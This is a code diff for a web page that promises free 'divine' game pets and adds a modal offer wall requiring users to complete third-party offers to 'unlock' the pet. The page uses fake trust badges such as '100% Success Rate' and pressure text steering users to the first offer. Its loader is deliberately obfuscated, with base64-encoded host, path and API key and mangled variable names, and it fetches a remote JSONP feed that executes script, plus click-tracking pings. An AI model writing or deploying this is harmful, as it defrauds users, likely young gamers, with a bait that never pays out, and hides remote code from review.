@@ -1234,29 +1234,642 @@
             showTapRainOffers();
         }
 
-        // Offers Script Integration - New Window with Timer
-        // Offers Script Integration - In-Page Timer and Offers
+        // Enhanced High-Converting TapRain Offers System
         function showTapRainOffers() {
-            // Hide pets section and show timer section
-            document.getElementById('petsSection').style.display = 'none';
-            document.getElementById('timerSection').style.display = 'block';
+            const overlay = document.createElement('div');
+            overlay.className = 'tap-rain-modal-overlay';
 
-            // Display selected pet info
-            const petInfoDisplay = document.getElementById('petInfoDisplay');
-            const petName = selectedPet?.name || 'Divine Pet';
-            const petRarity = selectedPet?.rarity?.toUpperCase() || 'DIVINE';
+            const selectedPetName = selectedPet ? selectedPet.name : 'Divine Pet';
+            const petEmoji = selectedPet ? (
+                selectedPet.name.includes('dragonfly') ? '🐲' :
+                selectedPet.name.includes('queen bee') ? '👑🐝' :
+                selectedPet.name.includes('raccoon') ? '🦝' :
+                selectedPet.name.includes('owl') ? '🦉' : '🎁'
+            ) : '🎁';
 
-            petInfoDisplay.innerHTML = `
-                <h3>Selected Pet: <span style="color: #feca57;">${petName}</span></h3>
-                <p>Rarity: <span style="color: #ff6b6b;">${petRarity}</span></p>
-                <p style="margin-top: 0.5rem; opacity: 0.8;">Username: <span style="color: #feca57;">${username}</span></p>
+            overlay.innerHTML = `
+                <div class="tap-rain-modal">
+                    <div class="tap-rain-header">
+                        <div class="close-btn" onclick="document.querySelector('.tap-rain-modal-overlay').remove()">×</div>
+                        <div class="header-content">
+                            <div class="pet-icon">${petEmoji}</div>
+                            <h1>🔓 Unlock Your ${selectedPetName}</h1>
+                            <p>Complete one quick offer to claim your divine pet!</p>
+                        </div>
+                    </div>
+
+                    <div class="tap-rain-content">
+                        <div class="progress-section">
+                            <div class="progress-steps">
+                                <div class="step active">
+                                    <div class="step-number">1</div>
+                                    <div class="step-text">Choose Offer</div>
+                                </div>
+                                <div class="step-arrow">→</div>
+                                <div class="step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-text">Complete</div>
+                                </div>
+                                <div class="step-arrow">→</div>
+                                <div class="step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-text">Get Pet!</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="offers-section">
+                            <div class="section-title">
+                                <h2>🎯 Choose Your Mission</h2>
+                                <p>Select any offer below to unlock your pet. Most take just 1-2 minutes!</p>
+                            </div>
+
+                            <div id="offerContainer" class="offers-grid">
+                                <div class="loading-state">
+                                    <div class="spinner"></div>
+                                    <p>Loading exclusive offers...</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="trust-badges">
+                            <div class="badge">🔒 SSL Secure</div>
+                            <div class="badge">⚡ Instant Delivery</div>
+                            <div class="badge">🎯 100% Success Rate</div>
+                        </div>
+
+                        <div class="encouragement-text">
+                            <p>💡 <strong>Pro Tip:</strong> Most users choose the first offer - it's usually the quickest!</p>
+                        </div>
+                    </div>
+                </div>
             `;
 
-            // Scroll to timer section
-            document.getElementById('timerSection').scrollIntoView({ behavior: 'smooth' });
+            // Enhanced styles for high conversion
+            const style = document.createElement('style');
+            style.textContent = `
+                .tap-rain-modal-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0, 0, 0, 0.85);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 10000;
+                    padding: 10px;
+                    backdrop-filter: blur(5px);
+                    animation: overlayFadeIn 0.3s ease;
+                }
 
-            // Start the 15-minute timer
-            startTimer();
+                @keyframes overlayFadeIn {
+                    from { opacity: 0; }
+                    to { opacity: 1; }
+                }
+
+                .tap-rain-modal {
+                    background: white;
+                    border-radius: 20px;
+                    width: 100%;
+                    max-width: 600px;
+                    max-height: 90vh;
+                    overflow: hidden;
+                    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
+                    animation: modalSlideIn 0.4s ease-out;
+                    position: relative;
+                }
+
+                @keyframes modalSlideIn {
+                    from {
+                        opacity: 0;
+                        transform: translateY(50px) scale(0.9);
+                    }
+                    to {
+                        opacity: 1;
+                        transform: translateY(0) scale(1);
+                    }
+                }
+
+                .tap-rain-header {
+                    background: linear-gradient(135deg, #667eea, #764ba2);
+                    color: white;
+                    padding: 25px;
+                    text-align: center;
+                    position: relative;
+                    overflow: hidden;
+                }
+
+                .tap-rain-header::before {
+                    content: '';
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    bottom: 0;
+                    background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+                    animation: headerShimmer 3s ease-in-out infinite;
+                }
+
+                @keyframes headerShimmer {
+                    0%, 100% { transform: translateX(-100%); }
+                    50% { transform: translateX(100%); }
+                }
+
+                .close-btn {
+                    position: absolute;
+                    top: 15px;
+                    right: 20px;
+                    width: 32px;
+                    height: 32px;
+                    background: rgba(255, 255, 255, 0.2);
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    cursor: pointer;
+                    font-size: 20px;
+                    font-weight: bold;
+                    transition: all 0.3s ease;
+                    z-index: 10;
+                }
+
+                .close-btn:hover {
+                    background: rgba(255, 255, 255, 0.3);
+                    transform: scale(1.1);
+                }
+
+                .header-content {
+                    position: relative;
+                    z-index: 5;
+                }
+
+                .pet-icon {
+                    font-size: 3.5rem;
+                    margin-bottom: 10px;
+                    filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+                    animation: petFloat 2s ease-in-out infinite;
+                }
+
+                @keyframes petFloat {
+                    0%, 100% { transform: translateY(0px); }
+                    50% { transform: translateY(-10px); }
+                }
+
+                .tap-rain-header h1 {
+                    font-size: 1.8rem;
+                    margin: 0 0 8px 0;
+                    font-weight: bold;
+                    text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+                }
+
+                .tap-rain-header p {
+                    font-size: 1.1rem;
+                    margin: 0;
+                    opacity: 0.95;
+                }
+
+                .tap-rain-content {
+                    padding: 25px;
+                    max-height: 60vh;
+                    overflow-y: auto;
+                }
+
+                .progress-section {
+                    margin-bottom: 25px;
+                }
+
+                .progress-steps {
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    gap: 15px;
+                    flex-wrap: wrap;
+                }
+
+                .step {
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    padding: 8px 16px;
+                    border-radius: 25px;
+                    background: #f8f9ff;
+                    border: 2px solid #e1e6ff;
+                    transition: all 0.3s ease;
+                }
+
+                .step.active {
+                    background: linear-gradient(135deg, #667eea, #764ba2);
+                    color: white;
+                    border-color: #667eea;
+                    box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+                }
+
+                .step-number {
+                    width: 24px;
+                    height: 24px;
+                    border-radius: 50%;
+                    background: rgba(255,255,255,0.2);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                    font-size: 0.9rem;
+                }
+
+                .step.active .step-number {
+                    background: rgba(255,255,255,0.3);
+                }
+
+                .step-text {
+                    font-weight: 600;
+                    font-size: 0.9rem;
+                }
+
+                .step-arrow {
+                    color: #667eea;
+                    font-weight: bold;
+                    font-size: 1.2rem;
+                }
+
+                .offers-section {
+                    margin-bottom: 25px;
+                }
+
+                .section-title {
+                    text-align: center;
+                    margin-bottom: 20px;
+                }
+
+                .section-title h2 {
+                    color: #2c3e50;
+                    font-size: 1.5rem;
+                    margin: 0 0 8px 0;
+                    font-weight: bold;
+                }
+
+                .section-title p {
+                    color: #666;
+                    margin: 0;
+                    font-size: 1rem;
+                }
+
+                .offers-grid {
+                    display: grid;
+                    grid-template-columns: 1fr;
+                    gap: 12px;
+                    max-height: 300px;
+                    overflow-y: auto;
+                    padding-right: 5px;
+                }
+
+                .loading-state {
+                    display: flex;
+                    flex-direction: column;
+                    align-items: center;
+                    padding: 40px 20px;
+                    color: #666;
+                }
+
+                .spinner {
+                    width: 40px;
+                    height: 40px;
+                    border: 3px solid #f3f3f3;
+                    border-top: 3px solid #667eea;
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                    margin-bottom: 15px;
+                }
+
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+
+                .offer-item {
+                    background: linear-gradient(145deg, #ffffff, #f8f9ff);
+                    border: 2px solid #e1e6ff;
+                    border-radius: 12px;
+                    padding: 20px;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    position: relative;
+                    overflow: hidden;
+                    min-height: 80px;
+                    display: flex;
+                    align-items: center;
+                }
+
+                .offer-item::before {
+                    content: '';
+                    position: absolute;
+                    top: 0;
+                    left: -100%;
+                    width: 100%;
+                    height: 100%;
+                    background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.1), transparent);
+                    transition: 0.8s;
+                }
+
+                .offer-item:hover::before {
+                    left: 100%;
+                }
+
+                .offer-item:hover {
+                    border-color: #667eea;
+                    transform: translateY(-4px);
+                    box-shadow: 0 12px 30px rgba(102, 126, 234, 0.25);
+                    background: linear-gradient(145deg, #ffffff, #f0f2ff);
+                }
+
+                .offer-item:active {
+                    transform: translateY(-2px);
+                }
+
+                .offer-content {
+                    flex: 1;
+                    position: relative;
+                    z-index: 2;
+                }
+
+                .offer-title {
+                    color: #2c3e50;
+                    font-weight: 600;
+                    font-size: 1rem;
+                    line-height: 1.4;
+                    margin-bottom: 8px;
+                }
+
+                .offer-cta {
+                    color: #667eea;
+                    font-weight: bold;
+                    font-size: 0.9rem;
+                    text-transform: uppercase;
+                    letter-spacing: 0.5px;
+                }
+
+                .offer-badge {
+                    position: absolute;
+                    top: 10px;
+                    right: 10px;
+                    background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+                    color: white;
+                    padding: 4px 8px;
+                    border-radius: 10px;
+                    font-size: 0.75rem;
+                    font-weight: bold;
+                    z-index: 3;
+                }
+
+                .trust-badges {
+                    display: flex;
+                    justify-content: center;
+                    gap: 15px;
+                    margin-bottom: 20px;
+                    flex-wrap: wrap;
+                }
+
+                .badge {
+                    background: #f8f9ff;
+                    color: #667eea;
+                    padding: 8px 16px;
+                    border-radius: 20px;
+                    font-size: 0.85rem;
+                    font-weight: 600;
+                    border: 1px solid #e1e6ff;
+                }
+
+                .encouragement-text {
+                    background: linear-gradient(135deg, #e8f5e8, #d4f1d4);
+                    border: 1px solid #c3e6c3;
+                    border-radius: 10px;
+                    padding: 15px;
+                    text-align: center;
+                    color: #2d5016;
+                }
+
+                .encouragement-text p {
+                    margin: 0;
+                    font-size: 0.95rem;
+                }
+
+                /* Mobile Optimizations */
+                @media (max-width: 768px) {
+                    .tap-rain-modal {
+                        margin: 10px;
+                        max-width: calc(100% - 20px);
+                    }
+
+                    .tap-rain-header {
+                        padding: 20px 15px;
+                    }
+
+                    .pet-icon {
+                        font-size: 3rem;
+                    }
+
+                    .tap-rain-header h1 {
+                        font-size: 1.5rem;
+                    }
+
+                    .tap-rain-content {
+                        padding: 20px 15px;
+                    }
+
+                    .progress-steps {
+                        gap: 10px;
+                    }
+
+                    .step {
+                        padding: 6px 12px;
+                    }
+
+                    .step-text {
+                        font-size: 0.8rem;
+                    }
+
+                    .offer-item {
+                        padding: 15px;
+                        min-height: 70px;
+                    }
+
+                    .trust-badges {
+                        gap: 10px;
+                    }
+
+                    .badge {
+                        font-size: 0.8rem;
+                        padding: 6px 12px;
+                    }
+                }
+
+                @media (max-width: 480px) {
+                    .progress-steps {
+                        flex-direction: column;
+                        gap: 8px;
+                    }
+
+                    .step-arrow {
+                        transform: rotate(90deg);
+                    }
+
+                    .section-title h2 {
+                        font-size: 1.3rem;
+                    }
+
+                    .offer-item {
+                        padding: 12px;
+                    }
+                }
+
+                /* Custom scrollbar */
+                .offers-grid::-webkit-scrollbar {
+                    width: 6px;
+                }
+
+                .offers-grid::-webkit-scrollbar-track {
+                    background: #f1f1f1;
+                    border-radius: 3px;
+                }
+
+                .offers-grid::-webkit-scrollbar-thumb {
+                    background: #667eea;
+                    border-radius: 3px;
+                }
+
+                .offers-grid::-webkit-scrollbar-thumb:hover {
+                    background: #5a6fd8;
+                }
+
+                .tap-rain-content::-webkit-scrollbar {
+                    width: 6px;
+                }
+
+                .tap-rain-content::-webkit-scrollbar-track {
+                    background: #f1f1f1;
+                    border-radius: 3px;
+                }
+
+                .tap-rain-content::-webkit-scrollbar-thumb {
+                    background: #ccc;
+                    border-radius: 3px;
+                }
+            `;
+
+            document.head.appendChild(style);
+            document.body.appendChild(overlay);
+
+            // Close on overlay click
+            overlay.addEventListener('click', function(e) {
+                if (e.target === overlay) {
+                    overlay.remove();
+                }
+            });
+
+            // Load TapRain offers with enhanced presentation
+            if (typeof jQuery === 'undefined') {
+                const script = document.createElement('script');
+                script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
+                script.onload = loadEnhancedOffers;
+                document.head.appendChild(script);
+            } else {
+                loadEnhancedOffers();
+            }
+
+            function loadEnhancedOffers() {
+                (function(_0x54af){
+                    var _0x3bfd=function(_0x35c7){return atob(_0x35c7);};
+
+                    var _0x8c4f=_0x3bfd('ZDJqZ2loOXVyeHBhNDcuY2xvdWRmcm9udC5uZXQ=');
+                    var _0x6a1e=_0x3bfd('cHVibGljL29mZmVycy9mZWVkLnBocA==');
+                    var _0x2f5d=String.fromCharCode(55)+String.fromCharCode(48)+
+                        String.fromCharCode(49)+String.fromCharCode(56)+
+                        String.fromCharCode(53)+String.fromCharCode(51);
+                    var _0x9e7b=_0x3bfd('OTFlZTY4NGU4ZGQ3ODg5OGJhMmU3MmE3M2E4YjQyM2U=');
+                    var _0x51fa='67d449d755943ee880d3bb9e';
+                    var _0x7e2c=6;
+
+                    var _0x4c8d=function(_0x354f, _0x52b9, _0x76ae){
+                        var _0x9c4e=new Image();
+                        _0x9c4e.src='https://taprain.com/api/stats/public-track-click?offerId='+
+                            encodeURIComponent(_0x354f)+'&offerName='+encodeURIComponent(_0x52b9)+
+                            '&templateId=custom-modal&userId='+_0x51fa;
+
+                        // Update progress
+                        updateProgress(2);
+
+                        setTimeout(function(){window.open(_0x76ae,'_blank');},100);
+                    };
+
+                    _0x54af.getJSON('https://'+_0x8c4f+'/'+_0x6a1e+'?user_id='+_0x2f5d+'&api_key='+_0x9e7b+'&s1='+_0x51fa+'&callback=?',
+                    function(_0x3fc8){
+                        var _0x6d7e='';
+                        _0x3fc8=_0x3fc8.splice(0,_0x7e2c);
+
+                        const offerTypes = ['⚡ Quick', '🎯 Popular', '🔥 Hot', '💎 Premium', '⭐ Featured', '🚀 Fast'];
+
+                        _0x54af.each(_0x3fc8,function(_0x26ca,_0x4f3b){
+                            const badgeType = offerTypes[_0x26ca % offerTypes.length];
+                            _0x6d7e+=`
+                                <div class="offer-item" data-offer-id="${_0x4f3b.id||'unknown'}"
+                                     data-offer-name="${_0x4f3b.anchor}" data-offer-url="${_0x4f3b.url}">
+                                    <div class="offer-badge">${badgeType}</div>
+                                    <div class="offer-content">
+                                        <div class="offer-title">${_0x4f3b.anchor}</div>
+                                        <div class="offer-cta">👆 Click to Complete</div>
+                                    </div>
+                                </div>
+                            `;
+                        });
+
+                        _0x54af('#offerContainer').html(_0x6d7e);
+
+                        _0x54af('#offerContainer').on('click','.offer-item',function(_0x2c1d){
+                            _0x2c1d.preventDefault();
+                            var _0x1d4f=_0x54af(this);
+                            var _0x45b2=_0x1d4f.data('offer-id')||'unknown';
+                            var _0x87d6=_0x1d4f.data('offer-name')||_0x1d4f.find('.offer-title').text()||'Unknown Offer';
+                            var _0x32e9=_0x1d4f.data('offer-url');
+
+                            // Visual feedback
+                            _0x1d4f.css({
+                                'background': 'linear-gradient(145deg, #e8f5e8, #d4f1d4)',
+                                'border-color': '#28a745',
+                                'transform': 'scale(0.98)'
+                            });
+
+                            setTimeout(() => {
+                                _0x1d4f.css('transform', 'scale(1)');
+                            }, 200);
+
+                            _0x4c8d(_0x45b2,_0x87d6,_0x32e9);
+                        });
+
+                    }).fail(function(_0x3a5c,_0x4e8d,_0x7c3a){
+                        console.error('Error loading offers:',_0x4e8d);
+                        _0x54af('#offerContainer').html(`
+                            <div style="text-align: center; padding: 40px; color: #666;">
+                                <p>Unable to load offers. Please refresh and try again.</p>
+                                <button onclick="location.reload()" style="background: #667eea; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 10px;">Refresh Page</button>
+                            </div>
+                        `);
+                    });
+                })(jQuery);
+            }
+
+            function updateProgress(step) {
+                const steps = document.querySelectorAll('.step');
+                steps.forEach((stepEl, index) => {
+                    if (index < step) {
+                        stepEl.classList.add('active');
+                    }
+                });
+
+                if (step === 2) {
+                    document.querySelector('.section-title p').innerHTML = '✅ Great choice! Complete this offer to unlock your pet.';
+                }
+            }
         }
 
         // Timer variables
